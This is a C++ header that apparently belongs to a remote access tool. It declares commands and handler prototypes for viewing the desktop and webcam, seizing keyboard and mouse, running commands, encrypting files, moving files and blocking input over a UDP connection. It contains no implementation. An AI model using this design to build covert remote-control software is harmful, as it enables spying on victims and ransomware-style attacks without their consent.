#pragma once

#ifndef __COMMANDPROPERTIES_HPP_INCLUDED__
#define __COMMANDPROPERTIES_HPP_INCLUDED__

enum class Commands : size_t
{
	UNDEFINED_COMMAND,

	MESSAGEBOX,
	VIEWDESKTOP_START,
	VIEWDESKTOP_STOP,
	VIEWWEBCAM_START,
	VIEWWEBCAM_STOP,
	KEYBOARDCTRL_ON,
	KEYBOARDCTRL_OFF,
	MOUSECTRL_ON,
	MOUSECTRL_OFF, 
	EXECUTECMD,
	ENCRYPTFILE,
	DECRYPTFILE,
	IMPORTFILE,
	EXPORTFILE,
	BLOCKINPUT_ON,
	BLOCKINPUT_OFF,
	PLAYSOUND_START,
	PLAYSOUND_STOP,

	CLOSE_CONNECTION,

	NUMBER_OF_COMMANDS
};

enum class COMMAND_IN_PROGRESS_BITS : size_t
{
	DESKTOP_VIEW,
	WEBCAM_VIEW,

	NUMBER_OF_BITS
};

using CIP_BITS = COMMAND_IN_PROGRESS_BITS;

#define CIP_NUMBER_OF_BITS static_cast<size_t>(CIP_BITS::NUMBER_OF_BITS)

using cip_t  = std::bitset<CIP_NUMBER_OF_BITS>;
using args_t = std::vector<std::string>;

struct CommandProperties 
{
	using command_t            = std::tuple<Commands, std::string>;
	using exec_func_t          = std::function<bool(const args_t&)>;
	using threaded_exec_func_t = std::function<void(const args_t&, cip_t&, size_t, boost::asio::io_context&, const boost::asio::ip::udp::endpoint&)>;
	using func_t               = std::variant<exec_func_t, threaded_exec_func_t>;

	command_t command;
	func_t    exec_func;
};

extern const std::array<CommandProperties, static_cast<size_t>(Commands::NUMBER_OF_COMMANDS)> COMMAND_PROPERTIES;

bool _onCmd_MESSAGEBOX       (const args_t &args);
void _onCmd_VIEWDESKTOP_START(const args_t &args, cip_t &cip, size_t pos, boost::asio::io_context &io_context, const boost::asio::ip::udp::endpoint &endpoint);
void _onCmd_VIEWDESKTOP_STOP (const args_t&, cip_t &cip, size_t pos, boost::asio::io_context&, const boost::asio::ip::udp::endpoint&);
void _onCmd_VIEWWEBCAM_START (const args_t &args, cip_t &cip, size_t pos, boost::asio::io_context &io_context, const boost::asio::ip::udp::endpoint &endpoint);
void _onCmd_VIEWWEBCAM_STOP  (const args_t&, cip_t &cip, size_t pos, boost::asio::io_context&, const boost::asio::ip::udp::endpoint&);
bool _onCmd_KEYBOARDCTRL_ON  (const args_t &args);
bool _onCmd_KEYBOARDCTRL_OFF (const args_t&) noexcept;
bool _onCmd_MOUSECTRL_ON     (const args_t &args);
bool _onCmd_MOUSECTRL_OFF    (const args_t&) noexcept;
bool _onCmd_EXECUTECMD       (const args_t &args);
bool _onCmd_ENCRYPTFILE      (const args_t &args);
bool _onCmd_DECRYPTFILE      (const args_t &args);
bool _onCmd_IMPORTFILE       (const args_t &args);
bool _onCmd_EXPORTFILE       (const args_t &args);
bool _onCmd_BLOCKINPUT_ON    (const args_t&) noexcept;
bool _onCmd_BLOCKINPUT_OFF   (const args_t&) noexcept;
bool _onCmd_PLAYSOUND        (const args_t &args);

#endif /* __COMMANDPROPERTIES_HPP_INCLUDED__ */